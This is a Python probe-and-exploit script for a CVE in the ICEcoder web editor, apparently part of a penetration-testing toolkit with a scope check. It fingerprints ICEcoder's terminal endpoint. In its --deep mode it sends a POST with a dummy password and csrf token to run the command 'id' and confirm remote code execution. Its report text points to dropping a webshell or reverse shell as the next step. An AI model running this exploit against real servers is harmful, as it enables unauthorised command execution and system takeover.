#!/usr/bin/env python3
"""ICEcoder CVE-2026-63722 表面（授权范围内）。

默认只 GET。--deep 才 POST command=id（任意 password + 非空 csrf）。
"""
from __future__ import annotations

import argparse
import json
import re
import sys
from datetime import datetime, UTC
from pathlib import Path
from typing import Any
from urllib.parse import urljoin

try:
    import requests
    requests.packages.urllib3.disable_warnings()  # type: ignore
except ImportError:
    print("[!] pip install requests", file=sys.stderr)
    sys.exit(1)

OPS = Path(__file__).resolve().parent
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))
from scope_lib import host_of, in_scope, write_probe_json  # noqa: E402

UA = "Mozilla/5.0 大爱仙尊-icecoder"
TERMINAL_PATHS = (
    "/lib/terminal-xhr.php",
    "/icecoder/lib/terminal-xhr.php",
    "/ICEcoder/lib/terminal-xhr.php",
)
HOME_PATHS = ("/", "/icecoder/", "/ICEcoder/")
NEEDLES = (
    "no command received",
    "sorry, no command",
    "sorry but you can't use this terminal",
    "shell usage not enabled in demo mode",
)


def _get(sess: requests.Session, url: str) -> dict[str, Any]:
    try:
        r = sess.get(url, timeout=12, verify=False, allow_redirects=True)
    except Exception as e:
        return {"url": url, "error": str(e)[:120]}
    text = r.text or ""
    return {
        "url": url,
        "status": r.status_code,
        "size": len(text),
        "jsonish": text.lstrip().startswith("{"),
        "needle": next((n for n in NEEDLES if n in text.lower()), ""),
        "title_icecoder": bool(re.search(r"<title>[^<]*ICEcoder", text, re.I)),
        "snip": re.sub(r"\s+", " ", text)[:160],
    }


def _post_cmd(sess: requests.Session, url: str, cmd: str = "id") -> dict[str, Any]:
    try:
        r = sess.post(
            url,
            data={"password": "x", "csrf": "1", "command": cmd},
            timeout=12,
            verify=False,
            allow_redirects=True,
        )
    except Exception as e:
        return {"url": url, "error": str(e)[:120]}
    text = r.text or ""
    return {
        "url": url,
        "status": r.status_code,
        "uid": bool(re.search(r"uid=\d+\(", text)),
        "snip": re.sub(r"\s+", " ", text)[:200],
    }


def run(args: argparse.Namespace) -> dict[str, Any]:
    host = host_of(args.base)
    if not host or not in_scope(host):
        print(f"[!] 不在 scope：{host or args.base}", file=sys.stderr)
        sys.exit(2)
    base = args.base.rstrip("/")
    sess = requests.Session()
    sess.headers["User-Agent"] = UA
    findings: list[dict[str, Any]] = []
    for p in HOME_PATHS:
        row = _get(sess, urljoin(base + "/", p.lstrip("/")))
        if row.get("title_icecoder"):
            row.update({"level": "L1", "signal": "icecoder-title"})
            findings.append(row)
            print(f"  L1 title {p}")
            break
    for p in TERMINAL_PATHS:
        row = _get(sess, urljoin(base + "/", p.lstrip("/")))
        if row.get("needle"):
            row.update({"level": "L1", "signal": "terminal-xhr-alive", "path": p})
            findings.append(row)
            print(f"  L1 terminal {p} needle={row['needle']}")
            break
        if row.get("status") == 200 and row.get("jsonish") and '"output"' in (row.get("snip") or ""):
            row.update({"level": "L1", "signal": "terminal-xhr-json", "path": p})
            findings.append(row)
            print(f"  L1 terminal-json {p}")
            if args.deep:
                hit = _post_cmd(sess, urljoin(base + "/", p.lstrip("/")))
                if hit.get("uid"):
                    hit.update({"level": "L2", "signal": "command-id", "path": p})
                    findings.append(hit)
                    print(f"  L2 command id {p}")
            break
    level = "none"
    for want in ("L2", "L1"):
        if any(f.get("level") == want for f in findings):
            level = want
            break
    report = {
        "target": base,
        "ts": datetime.now(UTC).isoformat(),
        "level": level,
        "findings": findings,
        "playbook": "传承/冰码·开天.md",
        "next": "默认 GET=L1；--deep 见 uid= 才是 L2。写马/反弹授权内直接做。",
    }
    out_path = write_probe_json(
        report, case=args.case, out=args.out, case_subdir="icecoder", filename="surface.json",
    )
    print(json.dumps({"level": level, "findings": len(findings), "out": str(out_path)}, ensure_ascii=False))
    return report


def main() -> None:
    ap = argparse.ArgumentParser(description="ICEcoder 表面（默认 GET；--deep 才 POST id）")
    ap.add_argument("--base", required=True)
    ap.add_argument("--case", default="")
    ap.add_argument("--out", type=Path, default=None)
    ap.add_argument("--deep", action="store_true", help="POST command=id")
    args = ap.parse_args()
    run(args)


if __name__ == "__main__":
    main()
